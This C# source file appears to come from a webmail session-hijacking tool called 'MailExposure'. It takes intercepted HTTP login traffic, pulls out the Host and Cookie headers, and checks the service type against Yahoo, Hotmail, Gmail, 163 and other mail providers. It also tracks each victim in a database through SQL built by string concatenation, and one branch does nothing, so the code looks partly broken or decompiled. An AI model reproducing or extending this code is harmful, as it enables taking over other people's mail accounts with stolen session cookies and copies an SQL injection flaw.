using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace MailExposure.CookieMailRC
{
    class Displace:MailStr
    {
        // Fields
        public int error;
        public string interceptTime;
        public string loginInfo;
        public string NO;
        public string objAddress;
        public string passwdType;
        public string sourceAddress;
        public string strCookies;
        public string strHost;
        public string url;
        public string userListName;
        public string UserName;

        // Methods
        public Displace()
        {
            this.strCookies = "";
            this.strHost = "";
            this.url = "";
        }
        public Displace(string no, string userName, string passwdType, string interceptTime, string sourceAddress, string objAddress, string loginInfo, string userListName)
        {
            this.strCookies = "";
            this.strHost = "";
            this.url = "";
            this.NO = no;
            this.UserName = userName;
            this.passwdType = passwdType;
            this.interceptTime = interceptTime;
            this.sourceAddress = sourceAddress;
            this.objAddress = objAddress;
            this.loginInfo = loginInfo;
            this.userListName = userListName;
        }
        public void filter()
        {
            int startIndex = 0;
            int index = 0;
            startIndex = this.loginInfo.IndexOf("Host:");
            if (startIndex == -1)
            {
                this.error = Convert.ToInt32(GlobalValue.mainForm.statusBarPanelLoginFailText.Text);
                this.error++;
                GlobalValue.mainForm.statusBarPanelLoginFailText.Text = this.error.ToString();
            }
            else
            {
                index = this.loginInfo.IndexOf("\r\n", startIndex);
                if (index == -1)
                {
                    this.error = Convert.ToInt32(GlobalValue.mainForm.statusBarPanelLoginFailText.Text);
                    this.error++;
                    GlobalValue.mainForm.statusBarPanelLoginFailText.Text = this.error.ToString();
                }
                else
                {
                    this.strHost = this.loginInfo.Substring(startIndex + 6, index - (startIndex + 6));
                    if (this.strHost.IndexOf("http") == -1)
                    {
                        this.url = "http://" + this.strHost.Trim() + "/";
                    }
                    else
                    {
                        this.url = this.strHost;
                    }
                    startIndex = this.loginInfo.IndexOf("Cookie:");
                    if (startIndex == -1)
                    {
                        this.error = Convert.ToInt32(GlobalValue.mainForm.statusBarPanelLoginFailText.Text);
                        this.error++;
                        GlobalValue.mainForm.statusBarPanelLoginFailText.Text = this.error.ToString();
                    }
                    else
                    {
                        index = this.loginInfo.IndexOf("\r\n", startIndex);
                        if (index == -1)
                        {
                            this.error = Convert.ToInt32(GlobalValue.mainForm.statusBarPanelLoginFailText.Text);
                            this.error++;
                            GlobalValue.mainForm.statusBarPanelLoginFailText.Text = this.error.ToString();
                        }
                        else
                        {
                            this.strCookies = this.loginInfo.Substring(startIndex + 8, index - (startIndex + 8));
                            this.strCookies = this.strCookies + ";";
                            if ((((((this.passwdType.ToUpper().IndexOf("YAHOO") == -1) && (this.passwdType.ToUpper().IndexOf("HOTMAIL") == -1)) && (this.passwdType.ToUpper().IndexOf("GMAIL") == -1)) && (this.passwdType.IndexOf("163") == -1)) && (this.passwdType.ToUpper().IndexOf("RU") == -1)) && (this.passwdType.ToUpper().IndexOf("HINET") == -1))
                            {
                                this.passwdType.ToUpper().IndexOf("126");
                            }
                        }
                    }
                }
            }
        }
        public void start()
        {
            string str = "1";
            string str2 = DateTime.Now.ToShortTimeString().Substring(0, 2);
            string str3 = "'" + str2 + "'";
            string strSql = "";
            try
            {
                strSql = "update users set 接收状态=" + str + ",接收=" + str3 + " where 序号=" + this.NO;
                GlobalValue.mainForm.ExecuteSQL(strSql);
                GlobalValue.mainForm.listBoxView.Items.Add("[" + this.UserName + "]: 开始过滤");
                GlobalValue.mainForm.listBoxView.SelectedIndex = GlobalValue.mainForm.listBoxView.Items.Count - 1;
                this.filter();
                GlobalValue.mainForm.listBoxView.Items.Add("[" + this.UserName + "]: 结束过滤");
                GlobalValue.mainForm.listBoxView.SelectedIndex = GlobalValue.mainForm.listBoxView.Items.Count - 1;
                str = "0";
                strSql = "update users set 接收状态=" + str + ",接收=" + str3 + " where 序号=" + this.NO;
                GlobalValue.mainForm.ExecuteSQL(strSql);
                base.completeThreads();
            }
            catch (Exception exception)
            {
                GlobalValue.mainForm.listBoxView.Items.Add(exception.Message + exception.StackTrace);
                GlobalValue.mainForm.listBoxView.SelectedIndex = GlobalValue.mainForm.listBoxView.Items.Count - 1;
            }
            finally
            {
                str = "0";
                strSql = "update users set 接收状态=" + str + ",接收=" + str3 + " where 序号=" + this.NO;
                GlobalValue.mainForm.ExecuteSQL(strSql);
            }
        }

    }
}
